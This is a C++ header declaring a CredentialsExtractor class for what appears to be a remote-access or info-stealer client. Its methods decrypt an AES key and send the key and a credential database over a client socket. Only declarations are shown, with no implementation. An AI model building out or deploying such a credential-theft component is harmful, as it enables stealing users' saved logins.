#ifndef CLIENT_CREDENTIALSEXTRACTOR_H
#define CLIENT_CREDENTIALSEXTRACTOR_H

#include "Base64.h"
#include "Sender.h"
#include <windows.h>
#include <vector>
#include <string>
#include <iostream>
#include "json.hpp"
#include "ZipCompressor.h"
#include "Handler.h"
#include "Download.h"

class CredentialsExtractor : public Handler {
public:
    Download &download;
    explicit CredentialsExtractor(ClientSocket &clientSocket, Download &download);
    std::vector<BYTE> decryptAESKey(const std::string& encryptedDataStr);
    std::vector<BYTE>  getDecryptedKey();
    void sendKeyAndDatabase(nlohmann::json);
};


#endif
